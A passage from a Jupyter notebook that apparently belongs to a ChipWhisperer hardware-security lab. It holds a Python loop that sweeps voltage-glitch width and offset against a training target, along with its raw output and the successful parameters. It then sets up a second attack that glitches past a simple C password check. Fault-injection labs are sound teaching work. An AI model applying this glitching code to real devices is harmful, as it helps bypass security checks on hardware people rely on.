     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success!!\u0001\u0000 \u0000\n",
      "False success\u001a\u0000!\u0001\u0000\n",
      "False success!\u0000\u0000\n",
      "False success\u0000\u0000\u0001\u0000\u0000\n",
      "False successÓ!\u0001\u0001\u0000\u0000\u0000\n",
      "False success\u0000\u0001\u0000\u0000\u0000\n",
      "False success\u0001\u0001 \u0000\u0000\n",
      "False success!  \u0000\u0000 \n",
      "False success\u001a! \u0000\n",
      "False success\u0000! \u0000 \u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success!\u0000!\u0001\u0000\n",
      "False success@  \u0000 \u0000\n",
      "False success\u0000 \u0000 \u0000\n",
      "False success\u0012 \u0000\u0000\n",
      "False success³ !\u0000\u0000\u0000\u0000\n",
      "False success\u001a\u0001! \u0000\u0000\u0000\n",
      "False success \u0000\u0000\u0000\u0000\u0000\n",
      "False success!!\u0001 \u0000\u0000\n",
      "False success\u0004!\u0000\u0000\u0000\n",
      "False success³\u0004\u0001\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success  \u0000\u0000\n",
      "False success!\u0000\u0001\u0000\u0000\n",
      "False success!!!\u0000 \u0000\n",
      "False success\u0005\u0000 \u0000 \u0000\n",
      "False success\u0014\u0001 \u0001  \n",
      "False success³ !\u0001\u0001\u0000\u0000\u0000\n",
      "False successÒ!!!   \u0000\n",
      "False success!!!! \u0000\n",
      "False success\u0001\u0001\u0000\n",
      "False success !!   \n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success:!\u0000 \u0000\u0000\u0000\n",
      "False success\u0004\u0000\u0000\u0000\n",
      "False success!!\u0001\u0000\u0000\n",
      "False success\u0004\u0001 !\u0000 \n",
      "False success\u001a!!\u0001\u0000\u0000\n",
      "False success! !\u0000\u0000\n",
      "False success\u001a \u0001\u0001 \u0000\n",
      "False success\u0001!\u0001\u0000\u0000\n",
      "False success\u0000\u0000\u0000\u0000\n",
      "False success \u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0012!!\u0000\n",
      "False success\u0004\u0001!!\u0000\u0000\n",
      "False success \u0000! \u0000\n",
      "False success   \u0000\n",
      "False success\u0001\u0001\u0000\n",
      "False successB\u0000\u0000 \u0000\n",
      "False success! \u0001! \u0000\n",
      "False success3\u0000!!\u0000\u0000\n",
      "False success   \n",
      "False successÓ!\u0000! \u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success!!!!\n",
      "False success\u0000\u0000\u0001\u0000\n",
      "False success\u001a!!! \u0000\u0000\n",
      "False success!  \u0000 \u0000\u0000\n",
      "False success! !!\n",
      "False success!!!   \n",
      "False success\u0012\u0004! \u0001\u0000 \u0000\n",
      "False success!! \u0000\u0000\n",
      "False success\u0004!\u0000\u0000\u0000\u0000\n",
      "False success\u0000  \u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success!\u0001!\u0000\u0000\u0000\n",
      "False success!!!\u0001  \u0000\n",
      "False success ! \n",
      "False success\u0000\u0004\u0000\u0000\u0000\n",
      "False success\u001a!!!\u0001\u0000\u0000\n",
      "False success\u0000!\u0000 \u0000\n",
      "False success!\u0001   \u0000\n",
      "False success\u0012 \u0000 \u0000\u0000\n",
      "False success\u0001!!\u0001 \u0000\u0000\n",
      "False successI \u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success3\u0000 \u0000\u0000\n",
      "False success\u0000! \u0000\u0000\n",
      "False success!!\u0000\u0000\n",
      "False success!! \u0001\u0000\u0000\n",
      "False success\u001a!!\u0001\u0001\u0000\u0000\n",
      "False success!\u0001\u0000\u0000\n",
      "False success  \u0000\u0000\u0000\n",
      "False success!! \u0001 \n",
      "False success !!\u0000  \n",
      "False success\u0000!\u0000\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000\u0000 \u0000\u0000\n",
      "False successi!\u0001\u0000  \n",
      "False success\u0001\u0000\u0000\u0000\n",
      "False success !\u0001\u0000\u0000\u0000\n",
      "False success!!!\u0000\u0000\n",
      "False success!!\u0000\n",
      "False success !!   \n",
      "False success!\u0000 \u0000\n",
      "False success\u0000\u0000  \n",
      "False success\u0004\u0001\u0000\u0000\u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success\u0000!\u0000\u0000\u0000\n",
      "False success   \u0001\u0000\u0000\n",
      "False success!\u0000\u0000\u0000\u0000\n",
      "False success\u0001 \u0000\u0000\u0000\n",
      "False success\u0000\u0000\u0000\u0000  \n",
      "False success \u0000\u0000\n",
      "False success\u0012\u0001\u0000 \u0000\n",
      "False success\u001a\u0000\u0001\u0000\u0000\n",
      "False success\u0001\u0000!\u0000\n",
      "False success\u001a!\u0000! \u0000 \n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "False success !\u0001\u0001\u0000\u0000\u0000\n",
      "False successi\u0001\u0000\u0000\u0000\u0000\n",
      "False success\u0001\u0000 \u0000\u0000\n",
      "False success\u0001!\u0000\u0000\n",
      "False success³\u0000\u0000\u0000\u0000\u0000\n",
      "False success !\u0000!\u0000\n",
      "False success\u0000\u0001 \u0000\u0000\n",
      "False success\u0000 \u0001 \n",
      "False success  \u0000\u0000 \n",
      "False success \u0001!  \u0000\n"
     ]
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "HBox(children=(IntProgress(value=0, max=10), HTML(value='')))"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Done glitching\n"
     ]
    }
   ],
   "source": [
    "from collections import namedtuple\n",
    "from tqdm import tnrange\n",
    "\n",
    "scope.io.hs2 = \"clkgen\"\n",
    "scope.glitch.output = \"glitch_only\"\n",
    "scope.glitch.width = 21.48\n",
    "scope.glitch.offset = 1.17\n",
    "scope.glitch.repeat = 1\n",
    "scope.io.glitch_lp = True\n",
    "\n",
    "sample_size = 10\n",
    "target.init()\n",
    "\n",
    "attack1_data = []\n",
    "scope.glitch.trigger_src = \"ext_continuous\"\n",
    "max_offset = 2\n",
    "max_width = 22\n",
    "while scope.glitch.width < max_width:\n",
    "    while scope.glitch.offset < max_offset:\n",
    "        for scope.glitch.ext_offset in tnrange(60, 100, leave=False):\n",
    "            successes = 0\n",
    "            good_str = response\n",
    "            for i in tnrange(sample_size, leave=False):\n",
    "                # call before trace things here\n",
    "\n",
    "                # flush the garbage from the computer's target read buffer\n",
    "                target.ser.flush()\n",
    "\n",
    "                # run aux stuff that should run before the scope arms here\n",
    "\n",
    "                scope.arm()\n",
    "                reset_target(scope)\n",
    "\n",
    "                timeout = 50\n",
    "                # wait for target to finish\n",
    "                while target.isDone() is False and timeout:\n",
    "                    timeout -= 1\n",
    "                    time.sleep(0.01)\n",
    "\n",
    "                try:\n",
    "                    ret = scope.capture()\n",
    "                    if ret:\n",
    "                        print('Timeout happened during acquisition')\n",
    "                except IOError as e:\n",
    "                    print('IOError: %s' % str(e))\n",
    "\n",
    "                # get the results from the scope\n",
    "                # read from the targets buffer\n",
    "                num_chars = target.ser.inWaiting()\n",
    "                response = target.ser.read(num_chars, timeout = 10)\n",
    "\n",
    "                # for table display purposes\n",
    "                success = 'Failed' not in repr(response) # check for glitch success (depends on targets active firmware)\n",
    "\n",
    "                if success:\n",
    "                    time.sleep(0.1) #wait a bit to let it print success\n",
    "                    num_chars = target.ser.inWaiting()\n",
    "                    response2 = target.ser.read(num_chars, timeout = 1)\n",
    "                    if 'Success' in repr(response2) or 'Success' in repr(response):\n",
    "                        successes += 1\n",
    "                        good_str = repr(response) + repr(response2)\n",
    "                    else:\n",
    "                        print(\"False success\" + response +response2)\n",
    "\n",
    "            attack1_data.append([scope.glitch.width, scope.glitch.ext_offset, successes/sample_size, good_str]) \n",
    "            # run aux stuff that should happen after trace here\n",
    "        scope.glitch.offset += 1\n",
    "    scope.glitch.width += 1\n",
    "\n",
    "print(\"Done glitching\")\n",
    "scope.glitch.trigger_src = \"ext_single\""
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 88,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Help on GPIOSettings in module chipwhisperer.capture.scopes.cwhardware.ChipWhispererExtra object:\n",
      "\n",
      "class GPIOSettings(chipwhisperer.common.utils.util.DisableNewAttr)\n",
      " |  GPIOSettings(cwextra)\n",
      " |  \n",
      " |  Provides an ability to disable setting new attributes in a class, useful to prevent typos.\n",
      " |  \n",
      " |  Usage:\n",
      " |  1. Make a class that inherits this class:\n",
      " |  >>> class MyClass(DisableNewAttr):\n",
      " |  >>>     # Your class definition here\n",
      " |  \n",
      " |  2. After setting up all attributes that your object needs, call disable_newattr():\n",
      " |  >>>     def __init__(self):\n",
      " |  >>>         self.my_attr = 123\n",
      " |  >>>         self.disable_newattr()\n",
      " |  \n",
      " |  3. Subclasses raise an AttributeError when trying to make a new attribute:\n",
      " |  >>> obj = MyClass()\n",
      " |  >>> #obj.my_new_attr = 456   <-- Raises AttributeError\n",
      " |  \n",
      " |  Method resolution order:\n",
      " |      GPIOSettings\n",
      " |      chipwhisperer.common.utils.util.DisableNewAttr\n",
      " |      builtins.object\n",
      " |  \n",
      " |  Methods defined here:\n",
      " |  \n",
      " |  __init__(self, cwextra)\n",
      " |      Initialize self.  See help(type(self)) for accurate signature.\n",
      " |  \n",
      " |  __repr__(self)\n",
      " |      Return repr(self).\n",
      " |  \n",
      " |  __str__(self)\n",
      " |      Return str(self).\n",
      " |  \n",
      " |  cs(self)\n",
      " |  \n",
      " |  miso(self)\n",
      " |  \n",
      " |  mosi(self)\n",
      " |  \n",
      " |  reset_target(self, initial_state=1, reset_state=0, reset_delay=0.01, postreset_delay=0.01)\n",
      " |  \n",
      " |  sck(self)\n",
      " |      # TODO: implement SCK/MOSI/MISO/CS?\n",
      " |  \n",
      " |  ----------------------------------------------------------------------\n",
      " |  Data descriptors defined here:\n",
      " |  \n",
      " |  extclk_src\n",
      " |      The clock signal being used as input for EXTCLK.\n",
      " |      \n",
      " |      Currently, this can only be HS1, which is the clock from the target.\n",
      " |      As such, this value is read-only.\n",
      " |  \n",
      " |  glitch_hp\n",
      " |      Whether the high-power crowbar MOSFET is enabled.\n",
      " |      \n",
      " |      The glitch output is an SMA-connected output line that is normally\n",
      " |      connected to a target's power rails. If this setting is enabled, a\n",
      " |      high-powered MOSFET shorts the power-rail to ground when the glitch\n",
      " |      module's output is active.\n",
      " |      \n",
      " |      Use with caution - ensure that the glitch module is properly configured\n",
      " |      before enabling this setting, as it is possible to permanently damage\n",
      " |      hardware with this output.\n",
      " |      \n",
      " |      Getter: Return True if enabled or False if disabled\n",
      " |      \n",
      " |      Setter: Turn the high-power MOSFET on or off\n",
      " |  \n",
      " |  glitch_lp\n",
      " |      Whether the low-power crowbar MOSFET is enabled.\n",
      " |      \n",
      " |      This is the low-power version of glitch_hp - see that documentation\n",
      " |      for more details.\n",
      " |  \n",
      " |  hs2\n",
      " |      The clock signal routed to the HS2 high speed output pin.\n",
      " |      \n",
      " |      Allowed clock signals are:\n",
      " |      - \"clkgen\": The output from the CLKGEN module\n",
      " |      - \"glitch\": The output from the glitch module\n",
      " |      - \"disabled\" / None: No clock; output driven low\n",
      " |      \n",
      " |      Getter: Return one of \"clkgen\", \"glitch\", or \"disabled\"\n",
      " |      \n",
      " |      Setter: Set the clock to be output on HS2.\n",
      " |          Raises: ValueError if new value not listed above\n",
      " |  \n",
      " |  nrst\n",
      " |      The state of the NRST pin.\n",
      " |      \n",
      " |      See pdic for more information.\n",
      " |  \n",
      " |  pdic\n",
      " |      The state of the PDIC pin output pin.\n",
      " |      \n",
      " |      This is a GPIO pin. The following values are allowed:\n",
      " |      - \"high\" / True: logic 1\n",
      " |      - \"low\" / False: logic 0\n",
      " |      - \"disabled\" / \"default\" / \"high_z\" / None: undriven\n",
      " |      \n",
      " |      Getter: Return one of \"high\", \"low\", or \"high_z\"\n",
      " |      \n",
      " |      Setter: Set the pin's state\n",
      " |          Raises: ValueError if new state not listed above\n",
      " |  \n",
      " |  pdid\n",
      " |      The state of the PDID pin.\n",
      " |      \n",
      " |      See pdic for more information.\n",
      " |  \n",
      " |  target_pwr\n",
      " |      Whether the target board is powered by the ChipWhisperer.\n",
      " |      \n",
      " |      If True, the ChipWhisperer is currently supplying power to the target\n",
      " |      board; if False, it is not. This setting can be used to cycle power to\n",
      " |      the target or to help program it.\n",
      " |      \n",
      " |      If the target board is powered through an external supply, this setting\n",
      " |      may have no effect.\n",
      " |      \n",
      " |      Getter: Return the current power state of the target (True or False)\n",
      " |      \n",
      " |      Setter: Turn the target power on or off.\n",
      " |  \n",
      " |  tio1\n",
      " |      The function of the Target IO1 pin.\n",
      " |      \n",
      " |      TIO1 can be used for the following functions:\n",
      " |      - \"serial_rx\": UART input\n",
      " |      - \"serial_tx\": UART output\n",
      " |      - \"high_z\" / None: High impedance input\n",
      " |      - \"gpio_low\" / False: Driven output: logic 0\n",
      " |      - \"gpio_high\" / True: Driven output: logic 1\n",
      " |      - \"gpio_disabled\": Driven output: no effect\n",
      " |      Default value is \"serial_rx\".\n",
      " |      \n",
      " |      Getter: Return one of the above strings\n",
      " |      \n",
      " |      Setter: Set the Target IO1 mode.\n",
      " |          Raises: ValueError if new value is not one of the above modes\n",
      " |  \n",
      " |  tio2\n",
      " |      The function of the Target IO2 pin.\n",
      " |      \n",
      " |      TIO2 can be used for the following functions:\n",
      " |      - \"serial_rx\": UART input\n",
      " |      - \"serial_tx\": UART output\n",
      " |      - \"high_z\" / None: High impedance input\n",
      " |      - \"gpio_low\" / False: Driven output: logic 0\n",
      " |      - \"gpio_high\" / True: Driven output: logic 1\n",
      " |      - \"gpio_disabled\": Driven output: no effect\n",
      " |      Default value is \"serial_tx\".\n",
      " |      \n",
      " |      Getter: Return one of the above strings\n",
      " |      \n",
      " |      Setter: Set the Target IO2 mode.\n",
      " |          Raises: ValueError if new value is not one of the above modes\n",
      " |  \n",
      " |  tio3\n",
      " |      The function of the Target IO3 pin.\n",
      " |      \n",
      " |      TIO3 can be used for the following functions:\n",
      " |      - \"serial_rx\": UART input\n",
      " |      - \"serial_tx\": UART output\n",
      " |      - \"serial_tx_rx\": UART 1-wire I/O (for smartcards)\n",
      " |      - \"high_z\" / None: High impedance input\n",
      " |      - \"gpio_low\" / False: Driven output: logic 0\n",
      " |      - \"gpio_high\" / True: Driven output: logic 1\n",
      " |      - \"gpio_disabled\": Driven output: no effect\n",
      " |      Default value is \"high_z\".\n",
      " |      \n",
      " |      Getter: Return one of the above strings\n",
      " |      \n",
      " |      Setter: Set the Target IO3 mode.\n",
      " |          Raises: ValueError if new value is not one of the above modes\n",
      " |  \n",
      " |  tio4\n",
      " |      The function of the Target IO4 pin.\n",
      " |      \n",
      " |      TIO4 can be used for the following functions:\n",
      " |      - \"serial_tx\": UART output\n",
      " |      - \"high_z\" / None: High impedance input\n",
      " |      - \"gpio_low\" / False: Driven output: logic 0\n",
      " |      - \"gpio_high\" / True: Driven output: logic 1\n",
      " |      - \"gpio_disabled\": Driven output: no effect\n",
      " |      Default value is \"high_z\". Typically, this pin is used as a trigger\n",
      " |      input.\n",
      " |      \n",
      " |      Getter: Return one of the above strings\n",
      " |      \n",
      " |      Setter: Set the Target IO4 mode\n",
      " |          Raises: ValueError if new value is not one of the above modes\n",
      " |  \n",
      " |  ----------------------------------------------------------------------\n",
      " |  Methods inherited from chipwhisperer.common.utils.util.DisableNewAttr:\n",
      " |  \n",
      " |  __setattr__(self, name, value)\n",
      " |      Implement setattr(self, name, value).\n",
      " |  \n",
      " |  disable_newattr(self)\n",
      " |  \n",
      " |  enable_newattr(self)\n",
      " |  \n",
      " |  ----------------------------------------------------------------------\n",
      " |  Data descriptors inherited from chipwhisperer.common.utils.util.DisableNewAttr:\n",
      " |  \n",
      " |  __dict__\n",
      " |      dictionary for instance variables (if defined)\n",
      " |  \n",
      " |  __weakref__\n",
      " |      list of weak references to the object (if defined)\n",
      "\n"
     ]
    }
   ],
   "source": [
    "help(scope.io)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that we've tried some glitches, let's look at the results. There's going to be a lot of data here, so we'll only print parameters that lead to successful glitches:"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 102,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[21.484375, 66, 1.0, \"'  \\\\x00\\\\x00\\\\x00Success!'''\"]\n",
      "[21.484375, 71, 0.7, \"'\\\\x9a\\\\x08!\\\\x01!\\\\x00 Success!'''\"]\n",
      "[21.484375, 82, 1.0, \"' \\\\x01!!\\\\x00\\\\x00Success!'''\"]\n",
      "[21.484375, 85, 1.0, \"'\\\\x9a\\\\x01 \\\\x01\\\\x00\\\\x00\\\\x00Success!'''\"]\n",
      "[21.484375, 98, 1.0, \"'\\\\x9a\\\\x00!\\\\x00Success!'''\"]\n"
     ]
    }
   ],
   "source": [
    "for row in attack1_data:\n",
    "    if row[2] > 0:\n",
    "        print(row)\n",
    "    #print(row)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "With any luck, you'll have some successful glitches. Create a smaller range of offsets and widths where the majority of successful glitches can be found. This will greatly speed up future attacks (though be sure not to make the bounds too small, since you might miss successful settings for some attacks). For example, you may have found most of your glitches between a width `[-9,-5]` and an offset of `[-37, -40]`, so good ranges might be `[-10, -4]` and `[-35, -41]`.\n",
    "\n",
    "If you didn't get any successful glitches, note that we only used an `offset` of `[-10,10]` or `[-49, -30]` (the max is `[-50, 50]`). Try using a larger range of offsets to see if a successful offset lies outside of this range.\n",
    "\n",
    "If you want to take this attack further, try reducing the `repeat` to 1 and iterating through `ext_offset` to look for the precise clock cycle where the glitch succeeds. To save time, pick a `width` and `offset` that worked for you and only vary `ext_offset`. Note that even with the right parameters and location, inserting a glitch won't always work, so a better strategy may be to loop infinitely over `ext_offset` values until you get a successful glitch.\n",
    "\n",
    "**HINT: We used a `repeat` of 105 for this attack (and an `ext_offset` of 0) on XMEGA, which put a glitch in each of the first 105 clock cycles. This means `ext_offset` must be in the range `[0,105]` for this target.**"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Attack 2"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Now that you (hopefully) have parameters that cause semi-reliable glitches, we can look at a more challenging example: a password check. Go back to `glitchsimple.c` and find the `glitch3()` function:\n",
    "\n",
    "```C\n",
    "void glitch3(void)\n",
    "{\n",
    "    char inp[16];\n",
    "    char c = 'A';\n",
    "    unsigned char cnt = 0;\n",
    "    uart_puts(\"Password:\");\n",
    "\n",
    "    while((c != '\\n') & (cnt < 16)){\n",
    "        c = getch();\n",
    "        inp[cnt] = c;\n",
    "        cnt++;\n",
    "    }\n",
    "\n",
    "    char passwd[] = \"touch\";\n",
    "    char passok = 1;\n",
    "\n",
    "    trigger_high();\n",
    "    trigger_low();\n",
    "\n",
    "    //Simple test - doesn't check for too-long password!\n",
    "    for(cnt = 0; cnt < 5; cnt++){\n",
    "        if (inp[cnt] != passwd[cnt]){\n",
    "            passok = 0;\n",
    "        }\n",
    "    }\n",
    "\n",
    "    if (!passok){\n",
    "        uart_puts(\"Denied\\n\");\n",
    "    } else {\n",
    "        uart_puts(\"Welcome\\n\");\n",
    "    }\n",
    "}\n",
    "```\n",
    "\n",
    "As you might expect, we'll try to glitch past the `if(!passok)` check towards the end of the code. Change `main()` to call `glitch3()` (running the block below will do this). Like before, we'll build and program the new firmware."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "%%bash\n",
    "# replaces glitch1() with glitch3()\n",
    "cd ../../hardware/victims/firmware/glitch-simple-lab1\n",
